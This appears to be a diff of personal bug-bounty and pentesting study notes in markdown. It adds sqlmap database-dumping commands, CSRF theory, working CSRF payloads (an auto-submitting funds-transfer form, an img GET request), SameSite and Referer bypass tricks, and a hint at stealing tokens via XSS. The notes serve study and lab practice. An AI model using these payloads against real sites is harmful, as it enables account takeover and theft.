@@ -10,13 +10,22 @@ pgrep -a "python3"
 
 Add Header Burpsuit : Proxy > Options > Match & Replace > Add Headers > Add Header: X-Forwarded-Token: 0.0.0.0
 ```
-Inverted scan A-B
+Inverted scan A-B ( Not correct, recheck again)
 `grep -vFf live_subdomain subdomain_fuzz`
+grep -vE 'expr' subdomain_fuzz # for inverted grep
+sort by word in vim
+`:g/<word>/m0`
+	- global search and move to 0 line
+`:args out/*`
 
 Best writeups:
+https://github.com/HackTricks-wiki/hacktricks/tree/master/src/pentesting-web/sql-injection
+
 https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPCSRF.md
 
+https://0xb0b.gitbook.io/writeups/tryhackme/2024/lookup
 
+ - reverse shell online
 
 TODO:
 	OSWAP tutorials 
@@ -197,10 +206,18 @@ TO READ:
 https://securityidiots.com/
 
 ## SQL Injection
+```
 sqlmap "http://example.com/page.php?id=1" --dbs # enumerate databases
 sqlmap -u "http://example.com/page.php?id=1" --D <DB-NAME> --tables # iterate tables names
 sqlmap -u "http://example.com/page.php?id=1" --D <DB-NAME> --dump # iterate tables names
-`sqlmap -u https://2bc4eae9ce149b2c788ef88e1ea52093.ctf.hacker101.com/login  --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "Invalid password" --level 2 --dump --random-agent`
+sqlmap -u https://2bc4eae9ce149b2c788ef88e1ea52093.ctf.hacker101.com/login  --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "Invalid password" --level 2 --dump --random-agent
+
+```
+cheatsheet
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+- Different comment at different databases, `--` or `#`
+
+
 ### Sqlite injection
 Flat files db are used for small db. Some sqlite commands are
 `PRAGMA table_info(<table-name>)`, `.tables`
@@ -378,7 +395,14 @@ Cross-Site Request Forgery (CSRF) attacks exploit the trust a website has in the
 `<img>` loads
 `<iframe>` loads
 `<script>` includes
-Method to find:
+For CSRF TO WORK
+3 things are required
+1) relavant action
+2) cookie based session handling:one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests
+3) No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password. 
+
+
+**Method to find:**
 1. Examine State-Changing Endpoints:
    - Find POST/PUT/DELETE endpoints that modify data
    - Check if they rely only on cookies for auth
@@ -394,6 +418,7 @@ Method to find:
    - Absence of CSRF tokens in forms
    - No Custom Headers like X-Requested-With
    - Missing Origin/Referer validation
+
 
 **TWO** types of csrf attacks:
 a. Basic csrf where just click of link is required to trigger the attack
@@ -417,9 +442,21 @@ Methods to protect against CSRF attacks:
   - Predicting or Interfering with Token Generation
   - Subdomain Cookie Injection:Injecting cookies into a user's browser from a related subdomain is another potentially sophisticated technique that might be used. This could fool the server's CSRF protection system by appearing authentic to the main domain.
 2. Samesite cookie:
+   ![Same site](images/samesite.png)
    - `Lax`, `strict` and `None` are the three options
    - `Lax` does not send cookie to cross site in post request. but if cookie is in argument then it is vulnerable as it can send the params to any site
    - Any cookie not set with samesite attribute will act as `samesite=None` for 2 minutes and then `samesite:lax` after that in chrome
+   - `Lax` can be bypass if GET request is used for changing state and navigation is preset 
+    - top level navigation
+	- `window.location.href = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';`
+	- symfony overrides the POST to GET request using `_method` , and other frameworks have similar things
+		`
+		<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
+		<input type="hidden" name="_method" value="GET">
+		<input type="hidden" name="recipient" value="hacker">
+		<input type="hidden" name="amount" value="1000000">
+		</form>
+		`
    - `Strict` is the most secure option for CSRF
    - `None` is the least secure option but requires `secure` option to send the request or https or not
 
@@ -449,15 +486,86 @@ Points to remember:
   send conent as `<input type="hidden"
      name='{"first_name":"sfdfds","last_name":"fuck it","phone_no":949721,"delivery_details":{"address_1":"vishal","address_2":"kumar","landmark":"basti","city":"basti","pincode":"272009","state":"Uttar Pradesh","address_type":"residential"},"billing_details":{"state":"Uttar Pradesh","pincode":"272009"},"promotional_emails":"always","email":"kensington111.imrane@megasend.org","padding":"'value='something"}' />
      `
-	 
+Payload of csrf in POST
+```
+<html>
+	<body>
+		<form id="csrfForm" action="https://victim-site.com/transfer" method="POST">
+			<input type="hidden" name="amount" value="1000">
+			<input type="hidden" name="to_account" value="attacker123">
+			<input type="submit" value="Submit CSRF Request">
+		</form>
+		<script>
+			// Auto-submit the form to trigger CSRF attack
+			document.getElementById("csrfForm").submit();
+		</script>
+	</body>
+</html>
+
+```
+Payload in GET
+```
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+```
+
+#### Remove csrf params and see if works or change post to get request
+#### Is csrf manage in global or user scope
+#### CSRF token is tied to a non-session cookie: 
+If any action allows attacker to  setting a cookie in victims browser then attack is possible.
+#### If csrf token is not present, and cookie is set to `Lax` 
+- Get request sends the lax cookies
+  - Check if `_method` is used in GET request argument so that the POST request can be converted to GET request
+- Link is top level navigation
+
+```
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+</script>
+```
+#### If authorization bearer token is present then csrf is not possbile unless added this token manually.
+But if xss is present then this can be stolen from local storage or cookie using `window.localStorage.getItem("token")` or `sessionStorage.getItem("token")`
+
+#### Bypass Samesite:strict
+1.  Redirect and missing csrf token exploit
+    - If there is a mechanism that triggers an additional request within the same domain, it can be exploited.
+    - An example of this is a client-side redirect that uses attacker-controlled input, such as URL parameters, to determine the redirection target. For examples, refer to our resources on DOM-based open redirection.
+    - these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place. But server side rediredirection has restrictions
+    - Find redirect path which you can control and then change the `post` request(CSRF) to `GET` request to replace with the redirect path and hence csrf can be exploited in this way
+2. Sibiling subdomain strict bypass
+
+#### Lax bypass
+retrigger the issue of cookie so that you can get 2 min window on chrome for passing the cookie with the request
+```
+window.onclick = () => {
+    window.open('https://vulnerable-website.com/login/sso');
+}
+```
+1. Identify if the cookie is set nothing so that LAX is being enforced after 120 sec by chrome
+2. find the form where csrf protection is not there
 ### **Effective CSRF Protection Practices**
 To secure against CSRF effectively, follow these practices:
 - **Generate Tokens Server-Side Only**: Generate tokens dynamically on the server for each session and associate them with that session. Do not store them in client-accessible files.
 - **Ensure Token Unpredictability**: Use a strong, random, unpredictable value for each token, rotating it with each session or request if possible.
 - **Bind Tokens to Sessions**: Tie tokens to user sessions to ensure they cannot be reused or forged by attackers.
 - **Restrict State-Changing Requests to `POST` (or non-`GET` methods)**: Only allow state-changing actions via `POST`, `PUT`, or `DELETE`, and ensure these actions always require a valid CSRF token.
-
+- Samesite Cookies
+- Referer based validation: Weakest defence
 By implementing these techniques, you’ll strengthen your application’s defense against CSRF, reducing the chance of successful exploitation.
+
+#### Referer usage for csrf
+1. If referer header is send which determines the response then the above meta tag can be used to disable the referer header
+
+`<meta name="referrer" content="never">`
+
+2. If referer header is validation is in place then following can be tried to bypass it
+`http://vulnerable-website.com.attacker-website.com/csrf-attack`
+
+3. If the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
+`http://attacker-website.com/csrf-attack?vulnerable-website.com`
+4. In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the Referer header by default.
+
+You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that Referrer is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string
+
 
 ## Authorisation
 
@@ -524,9 +632,6 @@ The session fixation attack “fixes” an established session on the victim's b
 - Session ID in a cookie
 
  
-## PATH traversal
-Go to different path traversal payload
-
 ## Shell command execution/Take over
 
 
